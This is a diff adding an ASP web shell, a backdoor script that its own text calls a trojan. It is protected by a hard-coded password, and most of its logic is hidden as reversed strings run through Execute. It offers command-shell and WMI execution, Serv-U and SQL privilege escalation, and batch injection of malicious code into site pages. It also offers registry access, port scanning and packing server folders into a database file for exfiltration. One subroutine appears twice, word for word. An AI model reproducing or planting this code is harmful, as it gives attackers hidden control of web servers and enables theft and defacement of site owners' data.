@@ -1,0 +1,1985 @@
+<%
+UserPass="71974200"
+
+Server.ScriptTimeout=999999999
+Response.Buffer =true
+On Error Resume Next
+sub ShowErr()
+If Err Then
+    RRS"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.DescrIption & "</a><br>"
+    Err.Clear:Response.Flush
+  ENd IF
+End SUB
+Sub RRS(Str)
+	Response.WRItE(Str)
+END Sub
+Function rePATH(S)
+  REpath=REpLAcE(s,"\","\\")
+ENd Function
+FuNctIon RRepaTh(S)
+  RREpaTH=rEplAcE(S,"\\","\")
+end fUncTion
+ShiSan="╁>retnec/<>a/<回返>')(kcab.yrotsih:tpircsavaj'=ferh a<>retnec<>rb<>rb<╁=lRukCAB╋)╁emaNF╁(TseUQer=EMANf╋)╁htaPredloF╁(tSeuqER=htAprEdLOF╋sSApResu=PrevreS╋lRU&)╁tsoh_ptth╁(selbaIRavreVRES.TSeuQeR=UrevreS╋)╁/╁(HTAppAM.REVrES=tOORWWW╋)╁.╁(HTapPAm.RevReS=HTApTooR╋)╁noitcA╁(tSEUQeR=NoITcA╋)╁RDDA_LACOL╁(sElBAIrAVReVrEs.tSEuqer=pirevreS╋)╁LRU╁(selbaiRAvrEVrEs.tSeuQER=lrU"
+ExeCuTe(ShiSanFun(ShiSan))
+dim ShiSan,ShiSanNewstr,ShiSanI
+Function ShiSanFun(ShiSanObjstr)
+ShiSanObjstr = Replace(ShiSanObjstr, "╁", """")
+For ShiSanI = 1 To Len(ShiSanObjstr)
+ If Mid(ShiSanObjstr, ShiSanI, 1) <> "╋" Then
+ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) & ShiSanNewStr
+ Else
+ShiSanNewStr = vbCrLf & ShiSanNewStr
+ End If
+Next
+ShiSanFun = ShiSanNewStr
+End Function
+rRs"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
+RRS"<title>"&ShellName&" - "&ServerIP&" </title>"
+RRs"<style type=""text/css"">"
+Rrs"body,td{font-family: Comic Sans Ms;font-size: 12px;background-color:#050505;color:fff;}"
+rrS"input,select,textarea{font-size: 12px;background-color:#EEB422;border:1px solid:#050505}"
+rrs".C{background-color:#050505;border:0px}"
+Rrs".cmd{background-color:#050505;color:#EEB422}"
+RRS"BODY {;SCROLLBAR-HIGHLIGHT-COLOR: #FFFFFF;SCROLLBAR-SHADOW-COLOR: #FFFFFF;SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #000000;SCROLLBAR-DARKSHADOW-COLOR: #FFFFF;SCROLLBAR-BASE-COLOR: #000000}"
+RrS"a{color:#EEB422;text-decoration: none;}a:hover{color:#EEB422;background:#050505}"
+rRs".am{color:#EEB422;font-size:11px;}"
+RrS"</style>"
+ShiSan="╋╋╁>tpircs/<╁sRR╋╁};eurt nruter;)(timbus.mroFbD;╁╁╁╁=LMTHrenni.cba;gp = eulav.egaP.mroFbD;rts = eulav.rtSlqS.mroFbD};eslaf nruter;)╁╁!确正否是句语LQS查检请╁╁(trela{)01<htgnel.rts(fi};eslaf nruter;)╁╁!确正否是串接连库据数查检请╁╁(trela{)5<htgnel.eulav.rtSbD.mroFbD(fi{)gp,rts(rtSlqSlluF noitcnuf╁SRR╋╁};eurt nruter};]i[rtS = eulav.rtSlqS.mroFbD{esle};)]i[rtS(trela{)21==i(fi esle};╁╁>retnec/<。句语令命作操LQS入输再库据数接连己认确请>retnec<╁╁=LMTHrenni.cba;╁╁╁╁ = eulav.rtSlqS.mroFbD;]i[rtS = eulav.rtSbD.mroFbD{)3=<i(fi;╁╁。节字个十五前的段字示显只据数条一过超n\.现实询查制控件条用可，节字部全的段字示显可即时据数条一示显只当╁╁ =]21[rtS;╁╁SSAP NMULOC PORD ]emaNelbaT[ ELBAT RETLA╁╁ =]11[rtS;╁╁)23(RAHCRAV SSAP NMULOC DDA ]emaNelbaT[ ELBAT RETLA╁╁ =]01[rtS;╁╁]emaNelbaT[ ELBAT PORD╁╁ = ]9[rtS;╁╁))05(RAHCRAV RESU,LLUN TON )1,1( YTITNEDI TNI DI(]emaNelbaT[ ELBAT ETAERC╁╁ = ]8[rtS;╁╁001=DI EREHW '\emanresu'\=RESU TES ]emaNelbaT[ ETADPU╁╁ = ]7[rtS;╁╁001=DI EREHW ]emaNelbaT[ MORF ETELED╁╁ = ]6[rtS;╁╁)'\drowssap'\,'\emanresu'\(SEULAV )SSAP,RESU(]emaNelbaT[ OTNI TRESNI╁╁ = ]5[rtS;╁╁001<DI EREHW ]emaNelbaT[ MORF * TCELES╁╁ = ]4[rtS;╁╁emaNnsD=nsD╁╁ = ]3[rtS;╁╁****=dwP;toor=diU;emaNbD=esabataD;6033=troP;╁&PIrevreS&╁=revreS;}lqSyM{=revirD╁╁ = ]2[rtS;╁╁****=dwP;as=diU;emaNbD=esabataD;3341,╁&PIrevreS&╁=revreS;}revreS lqS{=revirD╁╁ = ]1[rtS;╁╁***=drowssaP esabataD:BDELO teJ;bdm.bd\\╁&))╁htaPredloF╁(noisseS(htaPeR&╁=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP╁╁ = ]0[rtS;)21(yarrA wen = rtS};eslaf nruter{)0<i(fi{)i(rtSbDlluF noitcnuf╁SRR╋╁};eurt nruter};eslaf nruter;)0(rtSbDlluF;)╁╁库据数接连先请╁╁(trela{)╁╁╁╁ == eulav.rtSbD.mroFbD(fi{)(kcehCbD noitcnuf╁SRR╋╁}};╁╁╁╁ = eulav.emaNF.mrofedih.pot{esle};)(timbus.mrofedih.pot;noitcAF = eulav.noitcA.mrofedih.pot{)llun=!emaND(fi};╁╁rehtO╁╁ = emaND{esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,╁╁！在存否是件文意注,称名全件文bdM的缩压要入输请╁╁(tpmorp = emaND{)╁╁bdMtcapmoC╁╁==noitcAF(fi esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,╁╁！名同能不意注,称名全件文bdM的建新要入输请╁╁(tpmorp = emaND{)╁╁bdMetaerC╁╁==noitcAF(fi esle};emaND = eulav.emaNF.mrofedih.pot;)emaNF,╁╁称名全夹件文的建新要入输请╁╁(tpmorp = emaND{)╁╁redloFweN╁╁==noitcAF(fi esle};emaND+╁╁||||╁╁ =+ eulav.emaNF.mrofedih.pot;)emaNF,╁╁称名全夹件文标目到动移入输请╁╁(tpmorp = emaND{)╁╁redloFevoM╁╁==noitcAF(fi esle};emaND+╁╁||||╁╁ =+ eulav.emaNF.mrofedih.pot;)emaNF,╁╁称名全夹件文标目到动移入输请╁╁(tpmorp = emaND{)╁╁redloFypoC╁╁==noitcAF(fi esle};emaND+╁╁||||╁╁ =+ eulav.emaNF.mrofedih.pot;)emaNF,╁╁称名全件文标目到动移入输请╁╁(tpmorp = emaND{)╁╁eliFevoM╁╁==noitcAF(fi esle};emaND+╁╁||||╁╁ =+ eulav.emaNF.mrofedih.pot;)emaNF,╁╁称名全件文标目到制复入输请╁╁(tpmorp = emaND{)╁╁eliFypoC╁╁==noitcAF(fi;emaNF = eulav.emaNF.mrofedih.pot{)noitcAF,emaNF(mroFlluF noitcnuf╁SRR╋╁};)(timbus.mrofrdda.pot;redloF = eulav.htaPredloF.mrofrdda.pot{)redloF(redloFwohS noitcnuf╁SRR╋╁;)(kcolCnur};yalpsid+╁╁--  ╁&DA&╁→！╁╁=sutats.wodniw;)(gnirtSelacoLot.yadot =yalpsid rav;)(etaD wen = yadot rav;)001 ,╁╁)(kcolCnur╁╁(tuoemiTtes.wodniw = emiTeht{)(kcolCnur noitcnuf╁SRR╋╁};eslaf nruter esle;eurt nruter))╁╁？吗作操此行执要认确╁╁(mrifnoc( fi{)(kosey noitcnuf╁SRR╋╁;srorrEllik=rorreno.wodniw};eurt nruter{)(srorrEllik noitcnuf>tpircsavaj=egaugnal tpircs<╁SRR"
+ExeCuTe(ShiSanFun(ShiSan))
+
+Rrs "<body" 
+IF actiON="" theN rRS " scroll=no"
+rRs ">"
+DIm oBt(13,2)
+oBt(0,0) = "Scripting.FileSystemObject"
+  oBt(0,2) = "文件操作组件"
+Obt(1,0) = "wscript.shell"
+  obt(1,2) = "命令行执行组件"
+obT(2,0) = "ADOX.Catalog"
+  ObT(2,2) = "ACCESS建库组件"
+oBt(3,0) = "JRO.JetEngine"
+  obt(3,2) = "ACCESS压缩组件"
+OBt(4,0) = "Scripting.Dictionary" 
+  ObT(4,2) = "数据流上传辅助组件"
+OBT(5,0) = "Adodb.connection"
+  oBT(5,2) = "数据库连接组件"
+oBT(6,0) = "Adodb.Stream"
+  oBT(6,2) = "数据流上传组件"
+OBT(7,0) = "SoftArtisans.FileUp"
+  OBT(7,2) = "SA-FileUp 文件上传组件"
+obT(8,0) = "LyfUpload.UploadFile"
+  OBT(8,2) = "刘云峰文件上传组件"
+oBT(9,0) = "Persits.Upload.1"
+  oBt(9,2) = "ASPUpload 文件上传组件"
+obT(10,0) = "JMail.SmtpMail"
+  Obt(10,2) = "JMail 邮件收发组件"
+obt(11,0) = "CDONTS.NewMail"
+  ObT(11,2) = "虚拟SMTP发信组件"
+ObT(12,0) = "SmtpMail.SmtpMail.1"
+  oBT(12,2) = "SmtpMail发信组件"
+OBT(13,0) = "Microsoft.XMLHTTP"
+  OBt(13,2) = "数据传输组件"
+fOr I=0 tO 13
+	Set T=serVER.CReATEoBJEcT(obT(I,0))
+	If -2147221005 <> err Then
+	  ISoBJ=" √"
+	ELSE
+	  ISobj=" ×"
+	  eRr.cLEar
+	eNd iF
+	Set T=nOthInG
+	oBt(i,1)=IsoBj
+neXt
+IF foLderPaTH<>"" Then
+  sEssioN("FolderPath")=rRepatH(fOlDeRpATH)
+EnD If
+If SeSSIoN("FolderPath")="" THEN
+  fOLDERpAth=RoOTpaTH
+  SESSIOn("FolderPath")=fOLDeRPatH
+end IF
+fUNcTiOn MAINFORm()
+ShiSan="╋╋╁>elbat/<>rt/<>dt/<╁SRR╋╁>emarfi/<>'1'=redrobemarf '%001'=thgieh '%001'=htdiw 'eliF1wohS=noitcA?'=crs 'emarFeliF'=eman emarfi<╁sRr╋╁>dt<╁srR╋╁>dt/<>emarfi/<>'0'=redrobemarf '%001'=thgieh '%001'=htdiw 'uneMniaM=noitcA?'=crs 'tfeL'=eman emarfi<╁SRR╋╁>'071'=htdiw dt<>rt<>rt/<>dt/<>elbat/<>mrof/<>rt/<>dt/<╁SRR╋╁>dt<>dt/<』>a/<stnemucoD>')╁╁\\stnemucoD\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<pmeT>')╁╁\\pmeT\\swodniw\\:c╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<atad>')╁╁\\atad\\vrsteni\\23metsys\\SWODNIW\\:c╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<gifnoc>')╁╁\\gifnoc\\23metsys\\SWODNIW\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<LQS>')╁╁\\revreS LQS tfosorciM\\seliF margorP\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<revreSlaeR>')╁╁laeR\\seliF margorP\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<u-vres>')╁╁\\u-vres\\seliF margorP\\:c╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<erehwynAcp>')╁╁\\erehwynAcp\\cetnamyS\\ataD noitacilppA\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<DELCYCER>')╁╁\\DELCYCER\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<序程 >b/<→>b< 始开>')╁╁\\序程\\单菜」始开「\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<sresUllA>')╁╁\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『』>a/<margorP>')╁╁seliF margorP\\:C╁╁(redloFwohS:tpircsavaj'=ferh a<『：表列录目权提>rt<╁SRR╋╁>'elddim'=ngilav 'retnec'=ngila rt<  ╁SRR╋ ╁>')(daoler.noitacol.emarFeliF'=kcilcno '口窗主新刷'=eulav 'timbus'=epyt tupni< >'到转'=eulav 'timbus'=epyt 'timbuS'=eman tupni<>'retnec'=ngila '041'=htdiw dt<>dt/<╁SRR╋╁>'╁&)╁htaPredloF╁(noISseS&╁'=eulav '%001:htdiw'=elyts 'htaPredloF'=eman tupni<╁SRR╋╁>dt<>dt/<：栏址地>'retnec'=ngila '06'=htdiw dt<>rt<╁sRr╋╁>'tnerap_'=tegrat '╁&lrU&╁'=noitca 'tsop'=dohtem 'mrofrdda'=eman mrof<╁srr╋╁>'%001'=htdiw elbat<╁sRr╋╁>'2'=napsloc '03'=thgieh dt<>rt<╁srr╋╁>'0'=gnicapsllec '0'=gniddapllec 0=redrob  '%001'=thgieh '%001'=htdiw elbat<╁SrR╋╁>mrof/<╁sRR╋╁>╁╁emaNF╁╁=eman ╁╁neddih╁╁=epyt tupni<╁SrR╋╁>╁╁noitcA╁╁=eman ╁╁neddih╁╁=epyt tupni<╁SrR╋╁>╁╁emarFeliF╁╁=tegrat ╁╁╁&Lru&╁╁╁=noitca ╁╁tsop╁╁=dohtem ╁╁mrofedih╁╁=eman mrof<╁srR"
+ExeCuTe(ShiSanFun(ShiSan))
+End FuNCtiON
+funcTiOn maINmenU()
+RRs"<table width='100%' cellspacing='0' cellpadding='0'>"
+RrS"<tr><td height='5'></td></tr>"
+RRS"</td></tr>"
+iF OBT(0,1)=" ×" Then
+RRS"<tr><td height='24'>无FSO/无权限</td></tr>"
+Else
+RRS"<tr><td height=24 onmouseover=""menu1.style.display=''""><b>+>查看硬盘</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
+SET ABC=NEW LBf:RRS abC.SHOwDRiVeR():SET ABc=noTHing
+RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePAtH(WWWROot)&""")'>●站点根目录</a></td></tr>"
+RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&rEPaTh(RootPAth)&""")'>●本程序目录</a></td></tr>"
+RRS"<tr><td height='20'><a href='javascript:FullForm("""&rEPAth(sessiOn("FolderPath")&"\NewFolder")&""",""NewFolder"")'>●新建目录</a></td></tr>"
+RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>●新建文本</a></td></tr>"
+RRS"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>●上传文件</a></td></tr>"
+RRS"<tr><td height='20'><a href='?Action=PageAddToMdb' target='FileFrame'>●文件夹打包-解包</a></td></tr>"
+END if
+
+ShiSan="╋╋╁>elbat/<╁sRR╋╁>elbat/<>rt/<>dt/<水流随>p/<8002;ypoc&>'der:roloc'=elyts retnec=ngila dt<>rt<╁SRR╋╁>'%001'=htdiw 1=thgih rh<>retnec<>dt<>rt<╁sRR╋╁>rt/<>dt/<>a/<录登出退●>'pot_'=tegrat 'tuogoL=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╋╁>rt/<>dt/<>vid/<>a/<件文BDM缩压●>')╁╁bdMtcapmoC╁╁,╁╁╁&)╁bdm.atad\╁&)╁htaPredloF╁(noisseS(htaPeR&╁╁╁(mroFlluF:tpircsavaj'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<件文BDM立建●>')╁╁bdMetaerC╁╁,╁╁╁&)╁bdm.weN\╁&)╁htaPredloF╁(noisseS(htaPeR&╁╁╁(mroFlluF:tpircsavaj'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<库据数接连●>'emarFeliF'=tegrat 'reganaMbD=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>╁╁'enon'=yalpsid.elyts.2unem╁╁=tuoesuomno ╁╁'enon'=yalpsid;%001:htdiw;xp81:thgieh-enil╁╁=elyts 2unem=di vid<>b/<作操库据数-↓>b<>╁╁''=yalpsid.elyts.2unem╁╁=revoesuomno '42'=thgieh dt<>rt<╁SRR╋╋╁>rt/<>dt/<>a/<令命行执程远IMW●>'emarFeliF'=tegrat 'IMW=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<权提LQS●>'emarFeliF'=tegrat 'tiktoorlqS=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<权提U-vreS●>'emarFeliF'=tegrat 'uvreS=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁srR╋╁>rb<>a/<载下接直●>'emarFeliF'=tegrat 'daolpU=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rt/<>dt/<>a/<作操表册注●>'emarFeliF'=tegrat 'GERdaeR=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rt/<>dt/<>a/<器描扫口端●>'emarFeliF'=tegrat 'troPnacS=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁srR╋╁>rt/<>dt/<>a/<令命dmC行执●>'emarFeliF'=tegrat 'llehS1dmC=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁sRR╋╁>╁╁'enon'=yalpsid.elyts.3unem╁╁=tuoesuomno ╁╁'enon'=yalpsid;%001:htdiw╁╁=elyts 3unem=di vid<>b/<关相权提-↓ >b<>╁╁''=yalpsid.elyts.unem╁╁=revoesuomno 42=thgieh dt<>rt<╁SRR╋╋╁>rt/<>dt/<>a/<马木找查●>'emarFeliF'=tegrat 'PSAkcehC=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<马挂分部●>'emarFeliF'=tegrat 'mglp=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<>b/<换替>b<量批●>'emarFeliF'=tegrat '3=M&mglpC=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<>b/<马清>b<量批●>'emarFeliF'=tegrat '2=M&mglpC=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<>b/<马挂>b<量批●>'emarFeliF'=tegrat '1=M&mglpC=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>╁╁'enon'=yalpsid.elyts.2unem╁╁=tuoesuomno ╁╁'enon'=yalpsid;%001:htdiw;xp81:thgieh-enil╁╁=elyts 2unem=di vid<>b/<关相马挂-↓ >b<>╁╁''=yalpsid.elyts.unem╁╁=revoesuomno '42'=thgieh dt<>rt<╁SRR╋╋╁>rt/<>dt/<>a/<测探器务服●>'emarFeliF'=tegrat 'ofnIlanimreTteG=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<号帐组理管●>'emarFeliF'=tegrat 'resUnimdA=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rt/<>dt/<>a/<持支件组-息信机主●>'emarFeliF'=tegrat 'ofnIrevreS=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rt/<>dt/<>a/<号账户用-务服统系●>'emarFeliF'=tegrat 'esruoC=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>rb<>a/<录目写可看查●>'emarFeliF'=tegrat 'mroFevirDnacS=noitcA?'=ferh a<>'02'=thgieh dt<>rt<╁SRR╋╁>╁╁'enon'=yalpsid.elyts.4unem╁╁=tuoesuomno ╁╁'enon'=yalpsid;%001:htdiw╁╁=elyts 4unem=di vid<>b/<息信器务服-↓ >b<>╁╁''=yalpsid.elyts.unem╁╁=revoesuomno 42=thgieh dt<>rt<╁SRR"
+ExeCuTe(ShiSanFun(ShiSan))
+Call shellcore
+End FunCtion
+Sub PageAddToMdb()
+dim THEACT, tHepath
+theACT = rEQuesT("theAct")
+tHepaTH = RequESt("thePath")
+SeRvEr.scRIpTtIMEOut = 5000
+iF ThEACT = "addToMdb" TheN
+AddtoMDB(ThePath)
+RRS "操作完成!"
+ReSPoNse.End
+End IF
+IF tHeact = "releaseFromMdb" TheN
+UnPack(ThePath)
+RRS"操作完成!"
+ResPonSe.eND
+End If
+RRS "文件夹打包:<br/>"
+RRS "<form method=post target=main>"
+RRS "<input name=thePath value=""" & htMLEncoDE(SerVER.MAppATH(".")) & """ size=80>"
+RRS "<input type=hidden value=addToMdb name=theAct>"
+RRS "<select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option>"
+RRS "</select>"
+RRS "<br><input type=submit value='开始打包'>"
+RRS "<hr/>注: 打包生成HYTop.mdb文件,位于木马MM同级目录下"
+RRS "</form>"
+RRS "<hr/>文件包解开(需FSO支持):<br/>"
+RRS "<form method=post target=main>"
+RRS "<input name=thePath value=""" & htMLEncode(SErvEr.maPpATh(".")) & "\HYTop.mdb"" size=80>"
+RRS "<input type=hidden value=releaseFromMdb name=theAct><input type=submit value='帮我解开'>"
+RRS "<hr/>注: 解开来的所有文件都位于木马MM同级目录下"
+RRS "</form>"
+RRS "<hr/>"
+End Sub
+
+Sub AdDtOmdB(thePath)
+		oN eRRoR ResUMe nEXt
+		DiM rs, CONN, sTrEam, conNStr, ADocatALog
+		SEt rS = SERVER.crEAtEOBJeCT("ADODB.RecordSet")
+		seT sTrEAM = SerVer.CreAtEoBjECT("ADODB.Stream")
+		seT COnN = seRVEr.cREATEObjECt("ADODB.Connection")
+		seT aDOcAtalOg = serVeR.CReatEOBjEct("ADOX.Catalog")
+		ConNstR = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & servEr.mAPpaTH("HYTop.mdb")
+		ADocAtaLog.cReATe CoNnsTR
+		CoNN.OPen conNsTr
+		CONn.EXEcutE("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
+		STrEAm.OPEn
+		streaM.TypE = 1
+		rS.OPEN "FileData", cOnn, 3, 3
+		If ReQuEsT("theMethod") = "fso" theN
+			FsOTrEEforMDB thepaTH, Rs, sTrEAm
+		 eLSE
+			SATrEeforMDB thEpATH, Rs, STrEAm
+		enD IF
+		rs.ClosE
+		coNN.CLoSE
+		stREaM.CLosE
+		Set rs = NOThInG
+		set Conn = nothINg
+		sET stReam = NOThinG
+		SEt AdOcAtaloG = nOTHIng
+	End Sub
+
+Sub AdDtOmdB(thePath)
+		oN eRRoR ResUMe nEXt
+		DiM rs, CONN, sTrEam, conNStr, ADocatALog
+		SEt rS = SERVER.crEAtEOBJeCT("ADODB.RecordSet")
+		seT sTrEAM = SerVer.CreAtEoBjECT("ADODB.Stream")
+		seT COnN = seRVEr.cREATEObjECt("ADODB.Connection")
+		seT aDOcAtalOg = serVeR.CReatEOBjEct("ADOX.Catalog")
+		ConNstR = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & servEr.mAPpaTH("HYTop.mdb")
+		ADocAtaLog.cReATe CoNnsTR
+		CoNN.OPen conNsTr
+		CONn.EXEcutE("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
+		STrEAm.OPEn
+		streaM.TypE = 1
+		rS.OPEN "FileData", cOnn, 3, 3
+		If ReQuEsT("theMethod") = "fso" theN
+			FsOTrEEforMDB thepaTH, Rs, sTrEAm
+		 eLSE
+			SATrEeforMDB thEpATH, Rs, STrEAm
+		enD IF
+		rs.ClosE
+		coNN.CLoSE
+		stREaM.CLosE
+		Set rs = NOThInG
+		set Conn = nothINg
+		sET stReam = NOThinG
+		SEt AdOcAtaloG = nOTHIng
+	End Sub
+	
+sUb CreateFoldER(ThePath)
+		DIM i
+		I = instR(Thepath, "\")
+		Do whILe I > 0
+			iF fSOX.FoLDERExIsts(LEft(THEPaTH, i)) = faLse TheN
+				fSox.CreatEFOLDEr(lEft(THePatH, I - 1))
+			end If
+			IF INSTR(mid(THePAth, i + 1), "\") tHEN
+				i = i + INsTr(mid(ThePaTh, i + 1), "\")
+			 ELSe
+				i = 0
+			eND If
+		LOOP
+	eND sUB
+	
+	sUB SAtreEforMdB(thePaTh, rs, STREam)
+		diM iTeM, tHEFOlDER, SySFilELIsT
+		SYSfileliSt = "$HYTop.mdb$HYTop.ldb$"
+		SeT thEfoLdEr = sAX.NAMeSPaCe(thepath)
+		for eaCH iTEm in tHeFoldeR.iteMS
+			If ItEm.ISFoLDeR = TRUe tHen
+				SatrEEfoRMDB itEm.PatH, rs, Stream
+			 elSe
+				iF iNSTr(SYsFilELIsT, "$" & ItEm.naME & "$") <= 0 tHeN
+					rs.AddNew
+					rs("thePath") = MID(ITeM.PatH, 4)
+					sTrEAm.LoadfroMfiLe(ITEM.PATH)
+					RS("fileContent") = sTREAM.rEaD()
+					rs.uPDaTE
+				enD iF
+			enD If
+		NeXT
+		seT thefoLDeR = NoTHINg
+	END SUB
+
+
+Sub Message(state,msg,flag)
+Response.Write "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>"
+Response.Write "  <TR>"
+Response.Write "    <TD class=TBHead>系统信息</TD>"
+Response.Write "  </TR>"
+Response.Write "  <TR>"
+Response.Write "    <TD align=middle bgcolor=#ecfccd>"
+Response.Write "	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
+Response.Write "	    <TR>"
+Response.Write "		  <TD><FONT color=red>"
+Response.Write state
+Response.Write "</FONT></TD>"
+Response.Write "		<TR>"
+Response.Write "		  <TD><P>"
+Response.Write msg
+Response.Write "</P></TD>"
+Response.Write "		</TR>"
+Response.Write "	  </TABLE>"
+Response.Write "	</TD>"
+Response.Write "  </TR>"
+Response.Write "  <TR>"
+Response.Write "    <TD class=TBEnd>"
+Response.Write "	"
+If flag=0 Then
+Response.Write "	      <INPUT type=button value=关闭 onclick=""window.close();"">"
+Response.Write "	"
+Else
+Response.Write "	      <INPUT type=button value=返回 onClick=""history.go(-1);"">"
+Response.Write "	"
+End if
+Response.Write "	</TD>"
+Response.Write "  </TR>"
+Response.Write "</TABLE>"
+End Sub
+
+Function Red(str)
+Red = "<FONT color=#ff2222>" & str & "</FONT>"
+End Function
+Sub ScanDriveForm() '扫描磁盘信息
+Dim FSO,DriveB
+Set FSO = Server.Createobject("Scripting.FileSystemObject")
+Response.Write "<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>"
+Response.Write "  <TR>"
+Response.Write "    <TD colspan=5 class=TBHead>磁盘/系统文件夹信息</TD>"
+Response.Write "  </TR>"
+For Each DriveB in FSO.Drives
+Response.Write "  <TR align=middle class=TBTD>"
+Response.Write "    <FORM action="
+Response.Write "?Action=ScanDrive&Drive="
+Response.Write DriveB.DriveLetter
+response.write " method=Post>"
+response.write "<TD width=25"&chr(37)&"><B>盘符</B></TD>"
+response.write "<TD width=15"&chr(37)&">"
+response.write DriveB.DriveLetter
+response.write ":</TD>"
+response.write "	<TD width=20"&chr(37)&"><B>类型</B></TD>"
+response.write "	<TD width=20"&chr(37)&">"
+Select Case DriveB.DriveType
+Case 1: Response.write "可移动"
+Case 2: Response.write "本地硬盘"
+Case 3: Response.write "网络磁盘"
+Case 4: Response.write "CD-ROM"
+Case 5: Response.write "RAM磁盘"
+Case else: Response.write "未知类型"
+End Select
+Response.Write "	</TD>"
+Response.Write "	<TD><INPUT type=submit value=详细报告></TD>"
+Response.Write "	</FORM>"
+Response.Write "  </TR>"
+Next
+Response.Write "  <TR class=TBTD>"
+Response.Write "    <FORM action="
+Response.Write "?Action=ScFolder&Folder="
+Response.Write FSO.GetSpecialFolder(0)
+Response.Write " method=Post>		  "
+Response.Write "	<TD align=middle><B>Windows文件夹</B></TD>"
+Response.Write "	<TD colspan=3>"
+Response.Write FSO.GetSpecialFolder(0)
+Response.Write "</TD>"
+Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
+Response.Write "	</FORM>"
+Response.Write "  </TR>"
+Response.Write "  <TR class=TBTD>"
+Response.Write "    <FORM action="
+Response.Write "?Action=ScFolder&Folder="
+Response.Write FSO.GetSpecialFolder(1)
+Response.Write " method=Post>		  "
+Response.Write "	<TD align=middle><B>System32文件夹</B></TD>"
+Response.Write "	<TD colspan=3>"
+Response.Write FSO.GetSpecialFolder(1)
+Response.Write "</TD>"
+Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
+Response.Write "	</FORM>"
+Response.Write "  </TR>"
+Response.Write "  <TR class=TBTD>"
+Response.Write "    <FORM action="
+Response.Write "?Action=ScFolder&Folder="
+Response.Write FSO.GetSpecialFolder(2)
+Response.Write " method=Post>		  "
+Response.Write "	<TD align=middle><B>系统临时文件夹</B></TD>"
+Response.Write "	<TD colspan=3>"
+Response.Write FSO.GetSpecialFolder(2)
+Response.Write "</TD>"
+Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
+Response.Write "	</FORM>"
+Response.Write "  </TR>"
+Response.Write "</TABLE><BR>"
+Response.Write "<DIV align=center>"
+Response.Write "  <FORM Action="
+Response.Write "?Action=ScFolder method=Post>指定文件夹查询："
+Response.Write "    <INPUT type=text name=Folder>"
+Response.Write "	<INPUT type=submit value=生成报告>　指定文件夹路径。如：C:\ASP\"
+Response.Write "  </FORM>"
+Response.Write "<DIV>"
+Set FSO=Nothing
+End Sub
+Sub ScanDrive(Drive) '扫描指定磁盘
+Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
+If Drive <> "" Then
+Set FSO = Server.Createobject("Scripting.FileSystemObject")
+Set TestDrive = FSO.GetDrive(Drive)
+If TestDrive.IsReady Then
